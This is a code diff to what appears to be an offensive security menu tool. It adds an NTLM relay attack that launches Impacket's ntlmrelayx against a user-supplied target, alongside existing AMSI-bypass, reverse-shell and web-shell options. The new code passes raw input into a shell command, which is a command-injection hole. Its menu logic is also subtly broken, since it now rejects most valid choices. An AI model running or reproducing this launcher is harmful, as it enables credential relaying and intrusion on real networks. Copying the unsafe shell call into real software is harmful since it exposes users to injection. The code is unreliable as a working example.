@@ -166,7 +166,13 @@ def amsi_bypass_menu():
     # Execute the reverse shell with the provided IP and Port
     execute_reverse_shell(ip, port)
 
-# Sub-menus
+# NTLM Relay Attack
+def ntlm_relay_attack(target_ip, target_port):
+    print(f"Running NTLM Relay Attack on {target_ip}:{target_port}...")
+    command = f"python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t {target_ip}:{target_port} -smb2support"
+    subprocess.run(command, shell=True)
+
+# Gaining Access Menu updated
 def gaining_access_menu():
     print(f"\n{Fore.TEAL}Gaining Access:{Style.RESET_ALL}")
     options = [
@@ -178,6 +184,7 @@ def gaining_access_menu():
         "Web Shell Upload",
         "Yersinia Suite",
         "AMSI Bypass and Reverse Shell Execution",
+        "NTLM Relay Attack (Impacket)",
         "Return to Main Menu"
     ]
     display_in_columns(options, column_count=2)
@@ -185,6 +192,13 @@ def gaining_access_menu():
     choice = input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}")
     if choice == "8":
         amsi_bypass_menu()
+    elif choice == "9":
+        target_ip = input("Enter target IP for NTLM relay: ")
+        target_port = input("Enter target port for NTLM relay: ")
+        ntlm_relay_attack(target_ip, target_port)
+    else:
+        print(f"{Fore.RED}Invalid choice, returning to Gaining Access Menu.{Style.RESET_ALL}")
+        gaining_access_menu()
 
 def yersinia_menu():
     print(f"\n{Fore.TEAL}Yersinia Suite:{Style.RESET_ALL}")
@@ -218,7 +232,7 @@ def yersinia_menu():
 # Main Menu
 def main_menu():
     display_splash_screen()
-    check_and_install_tools(['nmap', 'hydra', 'msfvenom', 'metasploit', 'veil', 'ysoserial'])
+    check_and_install_tools(['nmap', 'hydra', 'msfvenom', 'metasploit', 'veil', 'ysoserial', 'impacket'])
 
     options = [
         "Penetration Testing Methodology",
